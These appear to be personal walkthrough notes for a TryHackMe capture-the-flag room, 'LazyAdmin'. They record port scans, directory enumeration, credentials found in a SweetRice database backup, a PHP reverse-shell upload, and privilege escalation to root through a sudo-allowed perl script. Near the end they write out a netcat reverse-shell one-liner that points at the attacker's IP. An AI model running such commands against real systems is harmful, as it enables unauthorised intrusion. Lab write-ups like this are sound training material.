https://tryhackme.com/room/lazyadmin

```
export IP=10.10.177.227; export MYIP=10.4.18.63
```

# namp
## init
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## extensive
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8029/tcp  filtered unknown
13891/tcp filtered unknown
16366/tcp filtered unknown
16980/tcp filtered unknown
17946/tcp filtered unknown
19287/tcp filtered unknown
22055/tcp filtered unknown
29907/tcp filtered unknown
31519/tcp filtered unknown
40284/tcp filtered unknown
45926/tcp filtered unknown
49764/tcp filtered unknown
51016/tcp filtered unknown
56207/tcp filtered unknown
60058/tcp filtered unknown
61774/tcp filtered unknown
64393/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## udp
```
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
631/udp  open|filtered ipp
5353/udp open|filtered zeroconf
```
# http
http://10.10.177.277
- default apache2 page

http://10.10.177.227/content/
Welcome to SweetRice


## ffuf /
```
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 272ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 274ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 274ms]
                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 2469ms]
content                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 272ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 272ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 272ms]
```

## ffuf /content
```
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 275ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 275ms]
                        [Status: 200, Size: 2199, Words: 109, Lines: 36, Duration: 283ms]
_themes                 [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 306ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4337ms]
attachment              [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 285ms]
as                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 288ms]
images                  [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 307ms]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 274ms]
index.php               [Status: 200, Size: 2199, Words: 109, Lines: 36, Duration: 289ms]
js                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 275ms]
```

# login page 
`http://10.10.177.227/content/as/`

## ffuf /content/as/
```
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 276ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1774ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4798ms]
                        [Status: 200, Size: 3669, Words: 144, Lines: 114, Duration: 4810ms]
index.php               [Status: 200, Size: 3678, Words: 144, Lines: 114, Duration: 306ms]
js                      [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 306ms]
lib                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 306ms]
```

# Credentials 
found in `http://10.10.177.227/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql`

```
manager:42f749ade7f9e195bf475f37a44cafcb
manager:Password123
```

# IDOR
upload a php reverse shell here: `http://10.10.177.227/content/as/?type=post&mode=insert`

# shell as www-data
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl


```

- `/home/itguy/backup.pl`
```
$ls /home/itguy/backup.pl -la
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl

$cat /home/itguy/backup.pl    
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

- `etc/copy.sh`
```
$cat copy.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.10.20 5554 >/tmp/f

$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.18.63 7778 >/tmp/f' > copy.sh
```

- obtain shell
```
sudo perl /home/itguy/backup.pl
```

attacker machine
```
$ nc -nvlp 7778                    
listening on [any] 7778 ...
connect to [10.4.18.63] from (UNKNOWN) [10.10.177.227] 33208
$id
uid=0(root) gid=0(root) groups=0(root)
```